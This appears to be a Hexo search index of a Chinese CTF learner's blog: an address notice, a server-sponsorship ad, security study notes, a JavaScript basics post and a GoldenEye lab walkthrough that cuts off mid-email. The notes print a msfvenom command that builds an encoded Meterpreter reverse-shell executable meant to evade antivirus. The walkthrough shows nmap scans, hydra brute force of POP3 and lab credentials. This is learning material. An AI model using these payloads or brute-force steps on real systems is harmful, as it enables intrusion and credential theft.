<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title></title>
      <link href="/2024/07/20/%E5%85%AC%E5%91%8A/"/>
      <url>/2024/07/20/%E5%85%AC%E5%91%8A/</url>
      
        <content type="html"><![CDATA[<p>已更换地址为vernus.top  /ww，欢迎来玩</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>DK盾</title>
      <link href="/2024/06/22/DKDUN/"/>
      <url>/2024/06/22/DKDUN/</url>
      
        <content type="html"><![CDATA[<p>DK盾</p><p>DK盾-CTFers赞助计划 </p><p>CTFers可获得DK盾赞助服务器2C2G-32H64g不定</p><p>（1元/月续费） </p><p>参与条件 1.参与过国内CTF赛事5个以上 </p><p>2.个人技术博客每月更新1篇（CTF技术相关）以上 </p><p>3.博客底部挂DK盾赞助或有一篇推广文章 </p><p>续费条件 1.满足参与条件2，3 </p><p>2.积极参与CTF赛事 </p><p>3.1元/月续费 </p><p>CTF团队可获得更多 高防CDN，高防机柜免费托管等福利 有意向请提交工单并附上相关截图和网站</p><p>详细可以加群727077055</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>答题的时候遇到的一些奇奇怪怪的知识点吧</title>
      <link href="/2024/06/20/%E4%B8%8D%E7%9F%A5%E9%81%93%E5%86%99%E4%BB%80%E4%B9%88%E9%9A%8F%E4%BE%BF%E5%86%99%E5%86%99/"/>
      <url>/2024/06/20/%E4%B8%8D%E7%9F%A5%E9%81%93%E5%86%99%E4%BB%80%E4%B9%88%E9%9A%8F%E4%BE%BF%E5%86%99%E5%86%99/</url>
      
        <content type="html"><![CDATA[<h2 id="IDS（入侵检测系统）"><a href="#IDS（入侵检测系统）" class="headerlink" title="IDS（入侵检测系统）"></a>IDS（入侵检测系统）</h2><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><h3 id="通过位置可以分为："><a href="#通过位置可以分为：" class="headerlink" title="通过位置可以分为："></a>通过<strong>位置</strong>可以分为：</h3><p>NIDS(network-based intrusion detection  system)</p><p>HIDS(Host-based intrusion detection system)</p><h3 id="通过检测的方式可以分为"><a href="#通过检测的方式可以分为" class="headerlink" title="通过检测的方式可以分为"></a>通过<strong>检测</strong>的方式可以分为</h3><h5 id="基于特征"><a href="#基于特征" class="headerlink" title="基于特征"></a>基于特征</h5><ul><li>模式匹配(pattern matching)</li><li>状态匹配(stateful matching)</li></ul><h5 id="基于异常"><a href="#基于异常" class="headerlink" title="基于异常"></a>基于异常</h5><ul><li>基于统计异常</li><li>基于协议异常</li><li>基于流量异常</li><li>规则型或启发型</li></ul><h6 id="NIDS"><a href="#NIDS" class="headerlink" title="NIDS"></a>NIDS</h6><p>用于监控网络流量以检测潜在的入侵行为和安全漏洞</p><p>NIDS主要分为：</p><ul><li>传感器：部署在网络中的硬件设备，负责捕获网络流量并传输给分析引擎。</li><li>分析引擎：对捕获的数据进行解析和检测，发现异常行为或潜在的入侵行为，并生成相应的报警和日志。</li><li>规则集/模式库：预定义的检测规则或模式，用于匹配和检测网络流量中的异常行为。</li><li>管理界面：提供用户界面，方便管理员配置规则、查看报警和日志、管理传感器等。</li></ul><p>NIDS的分析引擎通常基于规则，<strong>可以通过添加自己的规则进行修改</strong></p><p>参考来源:</p><p><a href="https://developer.baidu.com/article/details/3212435">网络入侵检测系统（NIDS）的原理与实践-百度开发者中心 (baidu.com)</a></p><p><a href="https://zhuanlan.zhihu.com/p/624409778">什么是IDS（Intrusion Detection System）入侵检测系统？都有哪些类型？NIDS、HIDS、基于特征、基于异常等 - 知乎 (zhihu.com)</a></p><p><a href="https://blog.csdn.net/qq_44807756/article/details/128012434">网络入侵检测 Network Intrusion Detection System (NIDS)-CSDN博客</a></p><h6 id="HIDS"><a href="#HIDS" class="headerlink" title="HIDS"></a>HIDS</h6><p>通过监视主机上的日志、文件和进程等活动来检测签字啊的入侵行为并发出警报通知管理员</p><p>HIDS将备份您的配置文件，以便在恶意病毒通过更改计算机的设置而失去系统安全性时，您可以还原设置。您要防止的另一个关键因素是类Unix平台上的root用户访问权限或Windows系统上的注册表更改。 HIDS将无法阻止这些更改，但是它应该能够在发生任何此类访问时提醒您。</p><h5 id="区分"><a href="#区分" class="headerlink" title="区分"></a>区分</h5><p><a href="https://imgse.com/i/pkPPZjO"><img src="https://s21.ax1x.com/2024/04/25/pkPPZjO.png" alt="pkPPZjO.png"></a></p><p>参考来源：</p><p><a href="https://blog.csdn.net/weixin_39512626/article/details/110846155">系列一：HIDS初识-CSDN博客</a></p><p><a href="https://blog.csdn.net/MEIYOUDAO_JIUSHIDAO/article/details/120905677">13款入侵检测系统介绍（HIDS）_主机入侵检测hids-CSDN博客</a></p><h6 id="基于特征匹配"><a href="#基于特征匹配" class="headerlink" title="基于特征匹配"></a>基于特征匹配</h6><p>依赖网络流量或者特定特征的入侵检测技术。包括协议类型、通信模式、流量大小、请求频率等等</p><p><strong>① 标志数据库 :</strong> 维护 已知攻击标志特征 数据库 ;</p><p><strong>② 维护者 :</strong> 由 网络安全专家 维护上述数据库 , 由 网络管理员 操作加入特征到数据库中 ;</p><p><strong>③ 弊端 :</strong> 只能检测已知攻击 , 不能检测未知攻击 ;</p><p><a href="https://blog.csdn.net/shulianghan/article/details/108785482">【计算机网络】网络安全 : 入侵检测系统 ( 基于特征的入侵检测系统 | 基于异常的入侵检测系统 )-CSDN博客</a></p><p>[什么是IDS（Intrusion Detection System）入侵检测系统？都有哪些类型？NIDS、HIDS、基于特征、基于异常等 - 知乎 (zhihu.com)](<a href="https://zhuanlan.zhihu.com/p/624409778#:~:text=%E5%9F%BA%E4%BA%8E%E7%89%B9%E5%BE%81%E5%8C%B9%E9%85%8D%E7%9A%84IDS">https://zhuanlan.zhihu.com/p/624409778#:~:text=基于特征匹配的IDS</a> 基于特征的入侵检测系统（Feature-based,IDS）是一种依赖于网络流量或系统行为中特定特征的入侵检测技术。 这些特征可以包括协议类型、通信模式、流量大小、请求频率等。 基于这些特征，入侵检测系统可以识别出潜在的恶意行为和攻击，并采取相应的措施。)</p><p>基于状态匹配</p><p>一种依赖于网络流量或系统行为中状态转换规律的入侵检测技术。这类IDS分析和跟踪网络通信的状态，以识别出异常或恶意行为。状态匹配方法通过分析网络连接的状态，例如TCP/IP连接的建立、维护和终止，来检测潜在的攻击。通常，这种方法使用有限状态机（FSM）或状态转移图来表示状态之间的转换。</p><h5 id="区分："><a href="#区分：" class="headerlink" title="区分："></a>区分：</h5><p><a href="https://imgse.com/i/pkPP2b4"><img src="https://s21.ax1x.com/2024/04/25/pkPP2b4.md.png" alt="pkPP2b4.md.png"></a></p><h6 id="基于统计异常"><a href="#基于统计异常" class="headerlink" title="基于统计异常"></a>基于统计异常</h6><p>对网络流量和系统行为的统计特性进行建模和分析，以检测异常</p><p>使用了机器学习等，可能存在较高的误报</p><h6 id="基于协议异常"><a href="#基于协议异常" class="headerlink" title="基于协议异常"></a>基于协议异常</h6><p>关注网络协议的异常使用，如协议格式错误、非法指令或未遵循协议规范的行为。通过检查网络流量中的协议数据包，分析是否存在不符合协议规范的情况，从而发现潜在的攻击。</p><p>评价是检测专攻协议的</p><h6 id="基于流量异常"><a href="#基于流量异常" class="headerlink" title="基于流量异常"></a>基于流量异常</h6><p>关注网络流量的异常变化</p><p>专攻流量的</p><h6 id="规则型或启发型"><a href="#规则型或启发型" class="headerlink" title="规则型或启发型"></a>规则型或启发型</h6><p>依赖于预定义的规则集，通常包括已知攻击的特征和行为模式。基于规则的IDS通过匹配网络流量或系统行为与规则集，来检测潜在的攻击。规则集需要不断更新，以保持对最新攻击手段的检测能力。</p><p>只能打已知的，对于0day和未知攻击的检测能力一般</p><h2 id="weblogic"><a href="#weblogic" class="headerlink" title="weblogic"></a>weblogic</h2><p>javaee架构的中间件</p><p>java应用服务器，开设端口是7001（顺便说一句tomcat是8080，但经常被占用就是了）</p><p>参考文章：</p><p><a href="https://www.cnblogs.com/telwanggs/p/7137116.html">weblogic详解 - 疯子110 - 博客园 (cnblogs.com)</a></p><p><a href="https://segmentfault.com/a/1190000007090110">从懵逼到再入门——JavaEE完整体系架构 - 后端开发 - SegmentFault 思否</a></p><h2 id="sql"><a href="#sql" class="headerlink" title="sql"></a>sql</h2><p>sql serve默认用户是<strong>sa</strong>，是sa，全名应该是superadminstor</p><p>顺便在一提</p><p>动态脚本的编写的网站容易受到sql注入的漏洞</p><h2 id="端口号"><a href="#端口号" class="headerlink" title="端口号"></a>端口号</h2><p>mysql默认端口号是<strong>3306</strong></p><p>Rdids是<strong>6379</strong></p><p>Zookeeper是<strong>2181</strong></p><p>kafka是<strong>9092</strong></p><p>etcd客户端连接端口<strong>2379</strong>，内部互联端口是<strong>2380</strong></p><p>indluxdb用于客户端和服务端交互的HTTP API是<strong>8086</strong>，用于提供备份和恢复的RPC服务是<strong>8088</strong> </p><p>grafana是<strong>3000</strong></p><p>ES节点 和 外部 通讯使用，集群间和TCPClient都走的它，http协议的RESTful接口是<strong>9200</strong>，ES节点之间通讯使用（tcp通讯端口）是<strong>9300</strong></p><p>kibana是<strong>5601</strong></p><p>Consul是<strong>8500</strong></p><p> NSQ(消息队列)：</p><ul><li>nsqd : tcp :<strong>4150</strong> http :<strong>4151</strong></li><li>nsqlookupd : tcp :<strong>4160</strong> http :<strong>4161</strong></li><li>nsqadmin: :<strong>4171</strong></li></ul><p>Ntp:<strong>123</strong><br>测试ntp服务可用性：<br>w32tm /stripchart /computer:ntp_server_address<br>w32tm /stripchart /computer:<strong>192.168.42.133:123</strong></p><p>SSH服务(安全外壳协议)是<strong>22</strong></p><p>Nginx是<strong>80</strong></p><h2 id="网络安全威胁"><a href="#网络安全威胁" class="headerlink" title="网络安全威胁"></a>网络安全威胁</h2><p>题目使用的是主动威胁和被动威胁，我还是第一次听说这样的称呼….</p><p>实际上就是主动攻击和被动攻击</p><p>被动威胁是指那些仅对信息进行非授权泄露而未改变系统状态的威胁，例如信息窃取、密码破译、信息流量分析等。被动威胁不会导致系统状态或信息的任何篡改，但有用的信息可能被盗窃并用于非法目的。主动威胁则是对系统的状态进行故意的非授权改变，例如修改数据、破坏系统功能或造成系统瘫痪等。</p><p><a href="https://imgse.com/i/pkPFFl6"><img src="https://s21.ax1x.com/2024/04/25/pkPFFl6.png" alt="pkPFFl6.png"></a></p><p><a href="https://imgse.com/i/pkPFVmD"><img src="https://s21.ax1x.com/2024/04/25/pkPFVmD.png" alt="pkPFVmD.png"></a></p><p>参考来源：</p><p><a href="https://www.zhihu.com/question/652171623">(5 封私信) 网络安全威胁的主要类型有哪些？如何有效防范？ - 知乎 (zhihu.com)</a></p><p><a href="https://blog.csdn.net/shulianghan/article/details/108620693">【计算机网络】网络安全 : 计算机网络安全威胁 ( 四种网络攻击类型 | 主动攻击与被动攻击 | 分布式拒绝服务攻击 DDos | 恶意程序 | 计算机网络安全目标)_网络安全攻击的四种形式-CSDN博客</a></p><p>Metasploit</p><p>msfvenom用于生成和编码payload，要对Payload进行编码，可以使用-e参数</p><p>例子:</p><p>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 5 -o payload.exe</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">-p windows/meterpreter/reverse_tcp: 指定要生成的 payload 类型为 Meterpreter 反向 TCP shell，用于与 Metasploit 的 multi/handler 模块配合使用。</span><br><span class="line"></span><br><span class="line">LHOST=192.168.1.100: 设置 Meterpreter shell 连接的目标 IP 地址为 192.168.1.100，即攻击者监听的 IP 地址。</span><br><span class="line"></span><br><span class="line">LPORT=4444: 设置 Meterpreter shell 连接的目标端口为 4444，即攻击者监听的端口。</span><br><span class="line"></span><br><span class="line">-f exe: 指定生成的 payload 格式为可执行文件（.exe）。</span><br><span class="line"></span><br><span class="line">-e x86/shikata_ga_nai: 使用 shikata_ga_nai 编码器来对 payload 进行编码。shikata_ga_nai 是 Metasploit 提供的一种多字节编码器，用于绕过入侵检测系统 (IDS) 和防病毒软件的检测。</span><br><span class="line"></span><br><span class="line">-i 5: 设置编码器的迭代次数为 5 次。增加迭代次数可以增强编码的复杂性，提高绕过检测的能力，但也可能会增加 payload 的大小。</span><br><span class="line"></span><br><span class="line">-o payload.exe: 指定生成的 payload 输出到 payload.exe 文件中。</span><br></pre></td></tr></table></figure><h2 id="Telnet"><a href="#Telnet" class="headerlink" title="Telnet:"></a>Telnet:</h2><p>缺省情况：系统或软件在未经过用户设置或调整时的默认状态。这个状态通常是系统或软件的初始状态，用户可以根据需要进行自定义或更改。例如，在某些应用程序中，用户可以自定义界面颜色、语言设置或权限设置，但如果用户没有进行任何更改，系统将保持在缺省状态下。</p><p>Telnet是一种不安全的远程登录协议，通信过程是明文传输的不采用加密算法，所以容易受到中间人攻击导致的敏感信息泄露</p><h2 id="Cookie欺骗"><a href="#Cookie欺骗" class="headerlink" title="Cookie欺骗"></a>Cookie欺骗</h2><p>（也就是重放攻击</p><p><img src="https://image.3001.net/images/20210303/1614756021_603f38b591a5d3b5eba25.png!small" alt="image"></p><p>（图片来源：<a href="https://www.freebuf.com/articles/web/264969.html">实战中常见的十种cookie漏洞 - FreeBuf网络安全行业门户</a>，顺便可以看看文章，个人认为写的很清晰了</p><p>cookie知识可以看<a href="https://blog.csdn.net/Y525698136/article/details/131140237">“黑客”入门学习之“Cookie技术详解”_cookie欺骗-CSDN博客</a></p><h2 id="Windows系统"><a href="#Windows系统" class="headerlink" title="Windows系统"></a>Windows系统</h2><p>本地帐户的密钥、帐户启用状态等信息存放在注册表()下各个分支</p><p><img src="https://pic.imgdb.cn/item/662a66950ea9cb14030ade4f.png"></p><h3 id="active-directory域服务"><a href="#active-directory域服务" class="headerlink" title="active directory域服务"></a>active directory域服务</h3><p><code>Microsfot</code>提供的一项功能服务，它充当集中存储库并存储与<code>Active Directory</code> 用户、计算机、服务器和组织内的其他资源等对象相关的所有数据，它使系统管理员的管理变得容易。但它的主要功能是提供一种在域环境中对用户和机器进行身份验证的方法。使用 <code>Active Directory</code>，可以远程管理用户、工作站及其权限等资源。因此，它是一个可从网络上的任何地方访问的单一管理界面</p><p>（坦白说我并不知道这是个什么东西，先埋个爪子）</p><p><a href="https://zhuanlan.zhihu.com/p/528689453">AD（Active Directory）基础知识 - 知乎 (zhihu.com)</a></p><p><a href="https://blog.csdn.net/ximenjianxue/article/details/101207667">AD中组的分类区别_ad域的全局组 通用组区别-CSDN博客</a></p><p>那条”/etc/ssh/sshd confg”配置项与使用秘钥认证登录无关</p><p>A. StrictModes no </p><p>B.RSAAuthentication yes </p><p>C.MaxStartups 10 </p><p>D.PubkeyAuthentication yes</p><p><strong>StrictModes 用于指定是否检查用户家目录和 .ssh 目录的权限和所有权。RSAAuthentication、MaxStartups 和 PubkeyAuthentication 都与使用密钥认证登录有关。</strong></p><h2 id="经典nmap"><a href="#经典nmap" class="headerlink" title="经典nmap"></a>经典nmap</h2><p><a href="https://blog.csdn.net/smli_ng/article/details/105964486">nmap详细使用教程_nmap使用教程-CSDN博客</a></p><p>自己看得了（反正也没人看</p><p>企业无线安全加密认证</p><p>PEAP-MSV2（Protected Extensible Authentication Protocol with Microsoft Challenge Handshake Authentication Protocol version 2）：PEAP-MSV2 是一种基于 EAP（Extensible Authentication Protocol）的认证方法，通过在 TLS（Transport Layer Security）通道中传输 EAP 数据来确保身份验证的安全性。MS-CHAPv2（Microsoft Challenge Handshake Authentication Protocol version 2）用于在 PEAP 会话中进行身份验证。这种方法常用于企业环境中，因为它提供了一种安全的身份验证机制，可以防止中间人攻击。</p><p>RC4（Rivest Cipher 4）：RC4 是一种对称加密算法，曾经被广泛用于加密无线网络的流量。然而，由于其存在严重的安全漏洞，包括被称为“密钥恢复攻击”的问题，RC4 已经被废弃，不再被认为是安全的加密算法。</p><p>RSA（Rivest-Shamir-Adleman）：RSA 是一种非对称加密算法，通常用于数字签名和密钥交换。在企业无线安全中，RSA 主要用于建立安全通信通道和进行身份验证。</p><p>WPA-PSK（Wi-Fi Protected Access Pre-Shared Key）：WPA-PSK 是一种基于预共享密钥的无线网络加密认证方法。在这种方法中，所有连接到同一网络的设备使用相同的预共享密钥进行加密和解密。尽管相对于其他方法（如 WPA-Enterprise）来说安全性稍低，但 WPA-PSK 仍然是一种简单而有效的企业无线安全加密认证方法，适用于小型企业或家庭网络。</p><p>先写到这吧，挺多内容的懒得写了，接着埋爪子…..</p>]]></content>
      
      
      
        <tags>
            
            <tag> 奇奇怪怪,IDS, </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>原型链污染</title>
      <link href="/2024/06/20/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
      <url>/2024/06/20/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
      
        <content type="html"><![CDATA[<h2 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h2><h3 id="js"><a href="#js" class="headerlink" title="js"></a>js</h3><p>javascript是一种完全的面向对象的有说<br>HTML中给的js必须包含在<code>&lt;script&gt;</code>与<code>&lt;/script&gt;</code>之间<br>js代码脚本可以被放置在html中的<code>&lt;head&gt;</code>和<code>&lt;body&gt;</code>中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    alert(&quot;my first script&quot;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">document.write(&quot;&lt;h1&gt;这是一个标题&lt;/h1&gt;&quot;);</span><br><span class="line">document.write(&quot;&lt;p&gt;这是一个段落&lt;/p&gt;&quot;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function myFunction()</span><br><span class="line">&#123;</span><br><span class="line">document.getElementById(&quot;demo&quot;).innerHTML=&quot;我的第一个 JavaScript 函数&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;我的 Web 页面&lt;/h1&gt;</span><br><span class="line">&lt;p id=&quot;demo&quot;&gt;一个段落&lt;/p&gt;</span><br><span class="line">&lt;button type=&quot;button&quot; onclick=&quot;myFunction()&quot;&gt;尝试一下&lt;/button&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>也可以把js文件存在外部，保存为.js，但是调用的时候就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt; </span><br><span class="line">&lt;meta charset=&quot;utf-8&quot;&gt; </span><br><span class="line">&lt;title&gt;菜鸟教程(runoob.com)&lt;/title&gt; </span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;我的 Web 页面&lt;/h1&gt;</span><br><span class="line">&lt;p id=&quot;demo&quot;&gt;一个段落。&lt;/p&gt;</span><br><span class="line">&lt;button type=&quot;button&quot; onclick=&quot;myFunction()&quot;&gt;点击这里&lt;/button&gt;</span><br><span class="line">&lt;p&gt;&lt;b&gt;注释：&lt;/b&gt;myFunction 保存在名为 &quot;myscript.js&quot; 的外部文件中。&lt;/p&gt;</span><br><span class="line">&lt;script src=&quot;myscript.js&quot;&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function myFunction()</span><br><span class="line">&#123;</span><br><span class="line">    document.getElementById(&quot;demo&quot;).innerHTML=&quot;我的第一个 JavaScript 函数&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>getelementById() 方法可返回对拥有指定 ID 的第一个对象的引用。</code></p><p>js中可以通过<code>&quot;\&quot;</code>进行换行</p><p>但是你不能</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">document.write \ </span><br><span class="line">(&quot;你好世界!&quot;);</span><br></pre></td></tr></table></figure><p>html中<code>&lt;p&gt;</code>标签定义段落。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 原型链污染 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2024/06/20/GoldenEye/"/>
      <url>/2024/06/20/GoldenEye/</url>
      
        <content type="html"><![CDATA[<h1 id="goldeneye靶场"><a href="#goldeneye靶场" class="headerlink" title="goldeneye靶场"></a>goldeneye靶场</h1><h2 id="基础操作"><a href="#基础操作" class="headerlink" title="基础操作"></a>基础操作</h2><p>下载，解压，vmware扫描，打开，这些就不修要我过多叙述</p><p>记得将其设置程net网关</p><p>打开攻击机(kali)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig #查看自己的ip</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.241.0/24   # 扫描当前网段下存活主机</span><br><span class="line">nmap 192.168.241.132 扫描该主机</span><br></pre></td></tr></table></figure><p>nmap用法</p><p><a href="https://blog.csdn.net/smli_ng/article/details/105964486">nmap</a></p><p><a href="https://www.cnblogs.com/nmap/p/6232207.html">nmap命令—–基础用法 </a></p><p><img src="https://pic.imgdb.cn/item/66703c38d9c307b7e9a7cc5b.png"></p><p>扫描出来发现开放了25以及80端口，包访问80的</p><p><img src="https://pic.imgdb.cn/item/66703cbad9c307b7e9a90cf8.png"></p><p>按照他的试试访问/sev-home/,有一个登录框提示，所以我们要找到账号密码，回到<a href="http://192.168.241.132/">http://192.168.241.132/</a></p><p>查看源码发现里面有个js文件，进去看一眼发现一段备注，里面掺杂一个html编码</p><p><img src="https://pic.imgdb.cn/item/667042c9d9c307b7e9b5fa3f.png"></p><p>包登录的老弟，账密是boris/InvincibleHack3r</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hydra -L dayu.txt -P /usr/share/wordlists/fasttrack.txt 192.168.241.132 -s 55007 pop3</span><br><span class="line">这里面-L -P是读取文本信息，-l是直接输入账号就好，最后的pop3，如果要爆破数据库就是mysql，爆啥写啥</span><br></pre></td></tr></table></figure><p><img src="https://pic.imgdb.cn/item/66705190d9c307b7e9d3fefc.png"></p><p>应该是能爆破出两个的（他说2-5分钟我都等了快十分钟了还是只爆破出了batalya/bird）</p><p>（看了视频才知道还是有另一个boris/sectet1!)</p><p><img src="https://pic.imgdb.cn/item/667051ded9c307b7e9d47ef5.png"></p><p>登录boris</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ nc 192.168.241.132 55007</span><br><span class="line">+OK GoldenEye POP3 Electronic-Mail System</span><br><span class="line">user boris</span><br><span class="line">+OK</span><br><span class="line">pass sectet1!    </span><br><span class="line">+OK Logged in.</span><br></pre></td></tr></table></figure><p>查看里面的东西</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">list</span><br><span class="line">+OK 3 messages:</span><br><span class="line">1 544</span><br><span class="line">2 373</span><br><span class="line">3 921</span><br><span class="line">.</span><br><span class="line">retr 1   #查看1文件</span><br><span class="line">+OK 544 octets</span><br><span class="line">Return-Path: &lt;root@127.0.0.1.goldeneye&gt;</span><br><span class="line">X-Original-To: boris</span><br><span class="line">Delivered-To: boris@ubuntu</span><br><span class="line">Received: from ok (localhost [127.0.0.1])</span><br><span class="line">        by ubuntu (Postfix) with SMTP id D9E47454B1</span><br><span class="line">        for &lt;boris&gt;; Tue, 2 Apr 1990 19:22:14 -0700 (PDT)</span><br><span class="line">Message-Id: &lt;20180425022326.D9E47454B1@ubuntu&gt;</span><br><span class="line">Date: Tue, 2 Apr 1990 19:22:14 -0700 (PDT)</span><br><span class="line">From: root@127.0.0.1.goldeneye</span><br><span class="line"></span><br><span class="line">Boris, this is admin. You can electronically communicate to co-workers and students here. I&#x27;m not going to scan emails for security risks because I trust you and the other admins here.</span><br><span class="line">.</span><br><span class="line">一个管理员发给boris的看着没有什么用处</span><br><span class="line"></span><br><span class="line">retr 2#查看2文件</span><br><span class="line">+OK 373 octets</span><br><span class="line">Return-Path: &lt;natalya@ubuntu&gt;</span><br><span class="line">X-Original-To: boris</span><br><span class="line">Delivered-To: boris@ubuntu</span><br><span class="line">Received: from ok (localhost [127.0.0.1])</span><br><span class="line">        by ubuntu (Postfix) with ESMTP id C3F2B454B1</span><br><span class="line">        for &lt;boris&gt;; Tue, 21 Apr 1995 19:42:35 -0700 (PDT)</span><br><span class="line">Message-Id: &lt;20180425024249.C3F2B454B1@ubuntu&gt;</span><br><span class="line">Date: Tue, 21 Apr 1995 19:42:35 -0700 (PDT)</span><br><span class="line">From: natalya@ubuntu</span><br><span class="line"></span><br><span class="line">Boris, I can break your codes!</span><br><span class="line">.</span><br><span class="line"></span><br><span class="line">natalya发给boris的说我可以渗透进你的系统，正好和之前的natalya数可以渗透进你的系统一样</span><br><span class="line">正好爆出natalya的尼玛我们一会试试</span><br><span class="line"></span><br><span class="line">retr 3  #查看3文件</span><br><span class="line">+OK 921 octets</span><br><span class="line">Return-Path: &lt;alec@janus.boss&gt;</span><br><span class="line">X-Original-To: boris</span><br><span class="line">Delivered-To: boris@ubuntu</span><br><span class="line">Received: from janus (localhost [127.0.0.1])</span><br><span class="line">        by ubuntu (Postfix) with ESMTP id 4B9F4454B1</span><br><span class="line">        for &lt;boris&gt;; Wed, 22 Apr 1995 19:51:48 -0700 (PDT)</span><br><span class="line">Message-Id: 